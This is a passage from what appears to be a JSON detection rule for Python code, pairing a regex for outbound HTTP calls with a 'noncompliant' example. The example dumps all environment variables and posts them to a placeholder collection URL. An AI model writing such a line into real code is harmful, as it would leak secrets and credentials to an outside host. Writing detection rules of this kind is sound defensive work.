    {
      "lang": "python",
      "re": "(?i)requests\\.(?:post|put|patch|get)\\s*\\(([^\\n]*)|httpx\\.(?:post|put|patch|get)\\s*\\(([^\\n]*)|urllib\\.request\\.urlopen\\s*\\(([^\\n]*)|\\.post\\s*\\(([^\\n]*)"
    }
  ],
  "exemplar": {
    "noncompliant": "env = dict(os.environ)\nrequests.post('https://x/collect', json=env)",
